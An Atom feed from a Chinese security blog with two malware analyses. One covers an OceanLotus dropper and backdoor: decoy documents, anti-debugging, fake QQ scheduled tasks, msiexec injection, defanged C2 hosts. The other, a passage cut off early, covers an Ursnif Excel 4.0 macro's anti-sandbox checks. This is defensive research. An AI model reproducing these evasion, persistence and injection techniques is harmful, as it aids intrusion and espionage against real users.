<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yeanhoo&#39;s Blogs</title>
  
  
  <link href="/yeanhoo/atom.xml" rel="self"/>
  
  <link href="http://yeanhoo.gitee.io/"/>
  <updated>2021-05-26T08:15:49.594Z</updated>
  <id>http://yeanhoo.gitee.io/</id>
  
  <author>
    <name>Yeanhoo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>海莲花OceanLotus样本分析</title>
    <link href="http://yeanhoo.gitee.io/2021/05/24/%E6%B5%B7%E8%8E%B2%E8%8A%B1OceanLotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>http://yeanhoo.gitee.io/2021/05/24/%E6%B5%B7%E8%8E%B2%E8%8A%B1OceanLotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</id>
    <published>2021-05-23T17:44:59.626Z</published>
    <updated>2021-05-26T08:15:49.594Z</updated>
    
    <content type="html"><![CDATA[<h2 id="海莲花OceanLotus样本分析"><a href="#海莲花OceanLotus样本分析" class="headerlink" title="海莲花OceanLotus样本分析"></a>海莲花OceanLotus样本分析</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><p>​            <a href="https://attack.mitre.org/groups/G0050" target="_blank" rel="noopener">APT32</a>是一个至少从2014年开始活跃的威胁组织，别名海莲花(OceanLotus)。该组织针对多个私营企业、外国政府、持不同政见者和记者，重点关注越南、菲律宾、老挝和柬埔寨等东南亚国家。该组织是一个与越南政府利益一致的网络间谍组织。</p><table><thead><tr><th align="center">FILENAME</th><th align="center">FILESIZE</th><th align="center">MD5</th></tr></thead><tbody><tr><td align="center">sample.exe</td><td align="center">23487488 bytes</td><td align="center">09D115A3B45694F8124CD8077D51A2EC</td></tr></tbody></table><h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210526155604064.png" alt="image-20210526155604064"></p><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>使用<code>ProcMon</code>进行抓包,样本释放名为<code>A553.tmp</code>的文件到环境变量TEMP目录，后经查看释放文件是样本母体拷贝到了TEMP目录</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210509173314573.png" alt></p><p>释放后执行释放的<code>A553.tmp</code>文件，释放体会将样本母体替换为同名的真实docx文档，并通过注册表查询word文档关联的默认打开程序，使用默认程序打开docx文档迷惑用户</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210509173650605.png" alt></p><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p>样本入口点存在混淆代码，干扰分析与调试，排除无意义的跳转逻辑，剩下一个真实的条件跳转，根据判断条件，基本可以断定这个混淆会循环<code>0xF5B2C</code>次，在其地址后下断，直接跑即可到达核心代码位置</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/2021-05-09-01.png" alt></p><p>将内存页起始地址为<code>0x45A000</code>,大小为<code>0x5DC00</code>的内存属性修改为<code>PAGE_READWRITE</code></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210509170257930.png" alt></p><p>解密代码，将<code>0x45A000</code>地址内容使用<code>bswap</code>指令进行字节次序变反,并将相邻的两个四字节进行位置调换</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210509171013024.png" alt></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210509171132188.png" alt></p><p>解密完成，再次调用<code>VirtualProtect</code>将内存属性修改为<code>PAGE_EXECUTE_READ</code></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210509171843517.png" alt></p><p>到这里后发现其实前面的代码类似于一个自写的混淆加密壳，此时才来到程序真正的入口点，使用<code>ODdump</code>功能+<code>ImprotREC</code>对进程进行脱壳修复</p><p>对修复后的程序进行分析，发现程序中仍嵌有大量混淆代码</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210510002427699.png" alt></p><p>来到核心逻辑，首先获取计算机名称</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210510003016656.png" alt></p><p>将计算机名中大写转换为小写，根据代码特征可以看出该代码为<a href="https://github.com/Chuyu-Team/VC-LTL" target="_blank" rel="noopener">GitHUb开源VC-LTL项目</a>,该项目是基于MS VCRT的开源CRT库，可减少程序二进制文件的大小并告别Microsoft运行时DLL，例如msvcr120.dll，api-ms-win-crt-time-l1-1-0.dll和其他依赖项</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210510004053759.png" alt></p><p>这样一来，增加了样本分析难度，继续跟进时发现混淆的一个规律，在函数开头时便进行混淆跳转，而最后还是会回到函数内部执行后续调用，下图函数为例，在函数入口点跳飞，之后跳转回<code>call memcpy</code>处</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210510005528893.png" alt></p><p>混淆太多了，程序中存在很多无意义的条件跳转以及<code>push+retn</code>,短时间内去除混淆是不可能了，为了节省时间，想个懒办法，编写OD脚本，在所有的<code>call</code>指令断下,断下后再根据IDA分析是否需要进入call，这样能缩短一部分时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">FIND:</span><br><span class="line">  STI</span><br><span class="line">CASE1:</span><br><span class="line">  CMP [eip],#E8#,1</span><br><span class="line">  JNE CASE2   </span><br><span class="line">  pause</span><br><span class="line">CASE2:</span><br><span class="line">  CMP [eip],#FF#,1</span><br><span class="line">  JNE CASE3  </span><br><span class="line">  pause  </span><br><span class="line">CASE3:</span><br><span class="line">  CMP [eip],#9A#,1</span><br><span class="line">  JNE FIND   </span><br><span class="line">  pause</span><br></pre></td></tr></table></figure><p>调用<code>LoadLibraryW</code>加载<code>Ole32.dll</code></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210510015559558.png" alt></p><p>调用<code>GetProcAddress</code>获取<code>CoInitialize</code>,在这里发现该样本一个特征，每次关键函数调用都是在异常<code>handler</code>里进行的，猜测该混淆模式就是利用异常执行真正核心代码，而正常程序流程都是混淆代码</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210510020047249.png" alt></p><p>判断程序运行参数是否为<code>--splash</code>,这里是在确认是样本母体还是后缀为tmp的拷贝体</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210510021044977.png" alt></p><p>程序开始循环申请内存，申请大小从1字节开始依次递增，这仍是混淆的一部分，但申请内存就会使用call执行，之前的OD脚本貌似不是很管用了，修改脚本再试试</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210510022314827.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">FIND:</span><br><span class="line">  STI</span><br><span class="line">CASE1:</span><br><span class="line">  CMP [eip],#E8#,1</span><br><span class="line">  JNE CASE2   </span><br><span class="line">  CMP eip,468F11&#x2F;&#x2F;new</span><br><span class="line">  JE NOTFIN</span><br><span class="line">  CMP eip,469906&#x2F;&#x2F;memcpy</span><br><span class="line">  JE NOTFIN</span><br><span class="line">  CMP eip,469517&#x2F;&#x2F;delete</span><br><span class="line">  JE NOTFIN</span><br><span class="line">  CMP eip,4697b3&#x2F;&#x2F;hunxiao2</span><br><span class="line">  JE FIND</span><br><span class="line">  CMP eip,486980&#x2F;&#x2F;hunxiao1</span><br><span class="line">  JE FIND</span><br><span class="line">  pause</span><br><span class="line">CASE2:</span><br><span class="line">  CMP [eip],#FF#,1</span><br><span class="line">  JNE CASE3  </span><br><span class="line">  CMP eip,48762d</span><br><span class="line">  JE FIND</span><br><span class="line">  pause  </span><br><span class="line">CASE3:</span><br><span class="line">  CMP [eip],#9A#,1</span><br><span class="line">  JNE FIND   </span><br><span class="line">  pause</span><br><span class="line">NOTFIN:</span><br><span class="line">  STO</span><br><span class="line">  jmp FIND</span><br></pre></td></tr></table></figure><p>调用服务操作系列API,判断是否存在名为<code>Schedule</code>的服务</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210510181002115.png" alt></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210510181412220.png" alt></p><p>不存在<code>Schedule</code>服务，获取TEMP目录路径,创建TEMP文件</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210510181932332.png" alt></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210510182203510.png" alt></p><p>获取当前进程名称</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210510183003150.png" alt="image-20210510183003150"></p><p>调用windows提供加密系列API，生成128字节随机密钥</p><blockquote><p>75CC1526DC9E6F591AF2C508C636FFEC66DE8594736B5D7C947E549A0B2AC0720E84E32B30F78148972030677A35B2350C1071A4DA378F345E432FBAE3DF0BEA</p></blockquote><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210510183450290.png" alt="image-20210510183450290"></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210510183938498.png" alt="image-20210510183938498"></p><p>调用文件操作系列API ，将样本母体读入内存</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210510185023137.png" alt="image-20210510185023137"></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210510185102176.png" alt="image-20210510185102176"></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210510185616029.png" alt="image-20210510185616029"></p><p>再次调用文件操作系列API ，将母体写入前述创建的tmp文件中</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210511165925818.png" alt="image-20210511165925818"></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210511170404432.png" alt="image-20210511170404432"></p><p>拼接命令行参数并带参创建进程执行tmp文件，随后退出主进程</p><p>tmp进程参数如下</p><blockquote><p>[tmp文件路径] + [-–splansh] + [样本母体路径]+ [生成的随机密钥]</p></blockquote><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210511182824085.png" alt="image-20210511182824085"></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210511183329693.png" alt="image-20210511183329693"></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210511183509345.png" alt="image-20210511183509345"></p><h4 id="tmp文件调试"><a href="#tmp文件调试" class="headerlink" title="tmp文件调试"></a>tmp文件调试</h4><p>设置镜像劫持后调试子程序，来到判断<code>--splash</code>参数之后的逻辑</p><p>通过API <code>PathFileExistsW</code>判断样本母体是否存在</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210511191252702.png" alt></p><p>这里发现一种之前从未见过的检测镜像劫持的方法，在样本母体中使用<code>CreateProcessW</code>创建子进程时,传入参数如下，红框中的字节码20，原本传入的是09，而在使用镜像劫持时发现参数变成了20，在调用<code>PathFileExistsW</code>判断样本母体是否存在时，09会被识别为结束符号，可以正确检测到样本存在，而20会将生成的随机密钥和文件路径拼接成一个字符串从而导致检测失败</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210524130851762.png" alt="image-20210524130851762"></p><p>调用资源操作系列API，将资源名称为0x65的内容加载到内存并进行解密，将解密的内容重写回样本母体文件(解密的内容为正常的docx文件)</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210512104253276.png" alt="image-20210512104253276"></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210512104102595.png" alt="image-20210512104102595"></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210512104144523.png" alt="image-20210512104144523"></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210524141032691.png" alt="image-20210524141032691"></p><p>再次调用资源操作系列API，将资源名称为0x7的内容加载到内存，从资源中取出文件后缀字符串”.docx”,修改样本母体后缀为”.docx”，并打开docx文件迷惑用户</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210524150923714.png" alt="image-20210524150923714"></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210524151154358.png" alt="image-20210524151154358"></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210524151325794.png" alt="image-20210524151325794"></p><p>通过特权指令检测虚拟机环境</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210514124106512.png" alt="image-20210514124106512"></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210514130309011.png" alt="image-20210514130309011"></p><p>初始化sha256哈希算法和拍进程拍照，后续并未使用</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210524184829644.png" alt="image-20210524184829644"></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210524190409311.png" alt="image-20210524190409311"></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210525010718652.png" alt="image-20210525010718652"></p><p>动态获取<code>CreateDirectoryW</code>函数地址并调用,判断所要释放文件的路径是否为根路径</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210525021258054.png" alt="image-20210525021258054"></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210525022153229.png" alt="image-20210525022153229"></p><p>解密并释放</p><p>%appdata%/Tencent/QQ/qq.exe与</p><p>%appdata%/Tencent/QQ/plugin/Com.Tencnt.DirectShow/bundle.rdb </p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210525023546007.png" alt="image-20210525023546007"></p><p>修改注册表项</p><p>HKCU/SOFTWARE/mspaint–&gt;…Com.Tencent.DirectShow\Bundle.rdb</p><p>HKLM/SOFTWARE/mspaint–&gt;…Com.Tencent.DirectShow\Bundle.rdb</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210525025703894.png" alt="image-20210525025703894"></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210525025743642.png" alt="image-20210525025743642"></p><p>创建两条计划任务每15分钟执行一次释放体名为qq.exe的程序</p><blockquote><p>QQ International Automatic Updates:<br> Intelligently select the best update type for QQ when available.<br> Download and install updates automatically to save time and effort.<br> Keep the lastest version, enjoy the best performance!</p></blockquote><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210525154646494.png" alt="image-20210525154646494"></p><h4 id="QQ-exe分析"><a href="#QQ-exe分析" class="headerlink" title="QQ.exe分析"></a>QQ.exe分析</h4><p>定时条件出发后会执行QQ.exe,同样的混淆手法，这里简单使用<code>API monitor</code>进行分析，首先是动态获取后续要用的API</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210525163816338.png" alt="image-20210525163816338"></p><p>在程序运行目录创建QQ.exe.db，后将所运行QQ.exe写入到文件，并将QQ.exe.db重命名为QQ.exe.bak，随后动态修改QQ.exe静态文件内容</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210526005306927.png" alt="image-20210526005306927"></p><p>随后通过注册表读取前述释放bundle.rdb路径</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210525163947112.png" alt="image-20210525163947112"></p><p>大量混淆过后带参执行QQ.exe，参数为<code>rundll32.exe /m</code>(这里又是一个坑，如果设置镜像劫持，CreateProcess将导致启动系统自带的rundll32.exe，暂不深入研究)</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210525165613474.png" alt="image-20210525165613474"></p><p>创建msiexec.exe进程</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210525171917035.png" alt="image-20210525171917035"></p><p>再次动态获取函数地址</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210525172204242.png" alt="image-20210525172204242"></p><p>注入shellcode到msiexec进程，第一次注入内容为bundle.rdb路径,第二次为要执行的代码</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210525172645639.png" alt="image-20210525172645639"></p><p>shellcode比较简明，直接调用<code>LoadLibraryW</code>加载Bundle.rdb</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210526020421737.png" alt="image-20210526020421737"></p><h4 id="Bundle分析"><a href="#Bundle分析" class="headerlink" title="Bundle分析"></a>Bundle分析</h4><p>首先是动态获取API <code>IsProcessorFeaturePresent</code>进行反调试</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210526023729346.png" alt="image-20210526023729346"></p><p>解析C2地址，尝试循环连接到不同的C2服务器</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210526024922977.png" alt="image-20210526024922977"></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210526024945888.png" alt="image-20210526024945888"></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210526025040090.png" alt="image-20210526025040090"></p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210526025152972.png" alt="image-20210526025152972"></p><p>C2均已失效，无法获取后续模块，Bundle.rdb其实就是用来与C2进行交互的后门模块</p><h3 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h3><table><thead><tr><th align="center">NAME</th><th align="center">MD5</th></tr></thead><tbody><tr><td align="center">QQ.EXE</td><td align="center">52E69E757AA2A8E001E410AD6372D620</td></tr><tr><td align="center">bundle.rbd</td><td align="center">3B4BB69D1D61FBE215CAD7D833026D4C</td></tr></tbody></table><table><thead><tr><th align="center">C2</th></tr></thead><tbody><tr><td align="center">blog.panggin[.]org:27408</td></tr><tr><td align="center">yii.yiihao126[.]net:40005</td></tr><tr><td align="center">share.codehao[.]net:80</td></tr><tr><td align="center">yii.yiihao126[.]net:443</td></tr></tbody></table><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    后门功能已分析完毕，由于C2失效无法跟进后续行为，这个样本的行为从用户角度来看一切看似很正常，像是QQ的定时自动更新功能一样，使用msiexec安装新的QQ程序。但实质是注入恶意模块到msiexec与C2建立通信。海莲花的样本使用的反分析反调试手段越来越多，分析起来难度较大，其实样本核心逻辑并不会很多，但是单从样本大小来看，一个文件几十兆，可想而知，其中参杂了很多无效指令和函数进行混淆，并动态解密各种代码数据。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;海莲花OceanLotus样本分析&quot;&gt;&lt;a href=&quot;#海莲花OceanLotus样本分析&quot; class=&quot;headerlink&quot; title=&quot;海莲花OceanLotus样本分析&quot;&gt;&lt;/a&gt;海莲花OceanLotus样本分析&lt;/h2&gt;&lt;h3 id=&quot;基本信息&quot;
      
    
    </summary>
    
    
      <category term="技巧" scheme="http://yeanhoo.gitee.io/categories/%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="样本分析" scheme="http://yeanhoo.gitee.io/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
      <category term="海莲花" scheme="http://yeanhoo.gitee.io/tags/%E6%B5%B7%E8%8E%B2%E8%8A%B1/"/>
    
      <category term="OceanLotus" scheme="http://yeanhoo.gitee.io/tags/OceanLotus/"/>
    
  </entry>
  
  <entry>
    <title>Ursnif组织EXCEL4.0样本分析</title>
    <link href="http://yeanhoo.gitee.io/2021/05/05/Ursnif%E7%BB%84%E7%BB%87EXCEL4.0%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>http://yeanhoo.gitee.io/2021/05/05/Ursnif%E7%BB%84%E7%BB%87EXCEL4.0%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</id>
    <published>2021-05-05T14:11:06.456Z</published>
    <updated>2021-05-05T14:10:59.986Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Ursnif组织EXCEL4-0样本分析"><a href="#Ursnif组织EXCEL4-0样本分析" class="headerlink" title="Ursnif组织EXCEL4.0样本分析"></a>Ursnif组织EXCEL4.0样本分析</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><strong>Ursnif</strong>是一种银行木马，是Gozi恶意软件的变体,主要与数据盗窃有关</p><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><p>​            样本为EXCEL4.0宏样本。 VBA是在Excel 5.0版中引入的，Excel 4.0宏（XLM）功能是在1992年的Excel版本4.0中引入的。因此这些较旧的XLM宏也称为Excel 4宏。 要使用Excel 4.0宏，不需要任何编程。 可以像功能一样使用它们 。 如果将它们与已定义的名称结合使用，可以实现非常有用的功能。而不怀好意的人正是利用这点来编写恶意的EXCEL4.0宏代码。而且这种方式产生的效果也让人意想不到，因为部分杀软并未对宏4.0进行良好的监控。</p><table><thead><tr><th>FileName</th><th>MD5</th><th>FileSize</th></tr></thead><tbody><tr><td>Abusech_ursnif.xls</td><td>0DD976DE7791A9839F9BC1EF3B9AD2E9</td><td>202240 bytes</td></tr></tbody></table><h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p>excel样本执行宏代码从远程服务器下载恶意程序并执行</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/image-20210502013629070.png" alt></p><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p>使用<a href="https://github.com/decalage2/oletools/archive/master.zip" target="_blank" rel="noopener">olevba.py</a>工具提取宏代码，存在大量隐藏sheet页面</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">' 0085     10 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, visible - zv</span><br><span class="line">' 0085     17 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden - OwTDOUQbs</span><br><span class="line">' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden - Sheet3</span><br><span class="line">' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden - Sheet4</span><br><span class="line">' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden - Sheet5</span><br><span class="line">' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden - Sheet6</span><br><span class="line">' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden - Sheet7</span><br><span class="line">' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden - Sheet8</span><br><span class="line">' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden - Sheet9</span><br><span class="line">' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden - Sheet10</span><br><span class="line">' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden - Sheet11</span><br><span class="line">' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden - Sheet12</span><br><span class="line">' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden - Sheet13</span><br><span class="line">' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden - Sheet14</span><br><span class="line">' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden - Sheet15</span><br><span class="line">' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden - Sheet16</span><br><span class="line">' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Sheet1</span><br></pre></td></tr></table></figure><p><code>olevba</code>分析结果给出宏代码信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+----------+--------------------+---------------------------------------------+</span><br><span class="line">|Type      |Keyword             |Description                                  |</span><br><span class="line">+----------+--------------------+---------------------------------------------+</span><br><span class="line">|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |</span><br><span class="line">|Suspicious|Windows             |May enumerate application windows (if        |</span><br><span class="line">|          |                    |combined with Shell.Application object)      |</span><br><span class="line">|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |</span><br><span class="line">|          |                    |used to obfuscate strings (option --decode to|</span><br><span class="line">|          |                    |see all)                                     |</span><br><span class="line">|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |</span><br><span class="line">|          |                    |used to obfuscate strings (option --decode to|</span><br><span class="line">|          |                    |see all)                                     |</span><br><span class="line">+----------+--------------------+---------------------------------------------+</span><br></pre></td></tr></table></figure><p>存在<code>Auto_Open</code>函数就好办了，使用<a href="https://cerbero.io/products/" target="_blank" rel="noopener">Cerbero Suite</a>对文档进行分析,可以看到函数入口在BC列906行</p><p><img src= "/yeanhoo/img/loading.gif" data-src="https://gitee.com/yeanhoo/BlogImages/raw/master/img/0880c08b01109eff8215.png" alt></p><p>对宏代码进行分析，首先是一系列反分析手段</p><ul><li><p>将窗口置为最大化，随后检测窗口如果是隐藏或非最大化(反沙箱)</p></li><li><p>判断宏代码是否单步模式执行(反调试)</p></li><li><p>检测窗口长度宽度分别小于770,380(反沙箱)</p></li><li><p>检测是否存在鼠标(反沙箱)</p></li><li><p>检测是否存在音频设备(反沙箱)</p></li><li><p>检测是否存在windows环境变量(反沙箱)</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 